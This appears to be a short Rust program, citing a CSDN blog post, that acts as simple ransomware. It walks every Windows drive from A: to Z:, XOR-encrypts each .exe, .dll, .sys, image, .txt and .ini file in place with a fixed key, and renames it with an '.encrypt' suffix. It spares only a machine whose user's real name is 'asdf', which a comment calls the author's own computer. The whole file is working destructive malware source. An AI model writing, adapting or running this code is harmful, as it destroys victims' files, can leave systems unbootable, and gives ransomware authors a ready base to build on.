//https://blog.csdn.net/wsp_1138886114/article/details/116454414

use lazy_static::lazy_static;
use std::fs;
use std::path::Path;
use std::{str, vec};
use walkdir::{self, Error, WalkDir};

lazy_static! {
    static ref kIncludeBackfix: Vec<&'static str> =
        vec![".exe", ".dll", ".png", ".jpg", ".bmp", ".txt", ".ini", ".sys"];
    static ref kHardDriver: Vec<&'static str> = vec![
        "A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:",
        "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"
    ];
}

pub fn encrypt_buffer(v: &mut Vec<u8>) {
    for byte in v.iter_mut() {
        *byte = *byte ^ 0x7A;
    }
}

pub fn encrypt_file(path: &Path) {
    let mut buffer = fs::read(path).expect("");
    encrypt_buffer(&mut buffer);
    fs::write(path, buffer);
    fs::rename(path, format!("{}.encrypt", path.display()));
}

fn main() -> Result<(), Error> {

    // this is my computer
    if whoami::realname() == "asdf" {
        println!("Host Computer\n");
        return Ok(());
    }

    for HardDriver in kHardDriver.iter() {
        for entry in WalkDir::new(HardDriver) {
            match entry {
                Ok(DirEntry) => {
                    // 判断指定文件是否符合目标后缀
                    let BackfixInclude = false;
                    for iter in kIncludeBackfix.iter() {
                        if DirEntry.file_name().to_str().unwrap().ends_with(iter) {
                            // 打印文件
                            println!("{}", DirEntry.path().display());
                            encrypt_file(DirEntry.path());
                        }
                    }
                }
                Err(error) => {}
            }
        }
    }

    Ok(())
}
